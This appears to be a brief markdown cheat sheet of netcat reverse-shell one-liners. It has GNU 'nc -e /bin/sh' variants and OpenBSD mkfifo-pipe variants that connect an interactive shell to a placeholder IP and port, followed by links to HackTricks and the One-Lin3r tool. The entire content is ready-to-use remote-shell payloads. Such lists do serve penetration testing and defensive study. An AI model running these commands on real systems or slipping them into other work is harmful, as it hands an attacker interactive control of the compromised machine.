# Netcat

## 01 - GNU

`$ nc -e /bin/sh <IP> <PORT>`

`$ nc -e /bin/bash <IP> <PORT>`

## 02 - OpenBSD

`$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f`

`$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f`

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)